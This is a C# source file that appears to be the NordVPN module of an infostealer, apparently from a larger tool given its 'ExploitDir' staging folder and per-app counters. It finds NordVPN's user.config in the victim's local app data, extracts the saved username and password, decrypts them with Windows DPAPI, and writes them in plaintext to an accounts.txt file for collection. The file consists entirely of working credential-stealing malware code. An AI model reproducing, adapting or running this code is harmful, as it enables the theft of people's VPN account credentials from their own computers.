using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace exos;

internal class NordVPN
{
	private static string Decode(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void Save()
	{
		string exploitDir = Helper.ExploitDir;
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				for (int j = 0; j < directories2.Length; j++)
				{
					string text = Path.Combine(directories2[j].FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(exploitDir + "\\VPN\\NordVPN\\");
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							string text2 = Decode(innerText);
							string text3 = Decode(innerText2);
							Counting.NordVPN++;
							File.AppendAllText(exploitDir + "\\VPN\\NordVPN\\\\accounts.txt", "Username: " + text2 + "\nPassword: " + text3 + "\n\n");
						}
					}
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
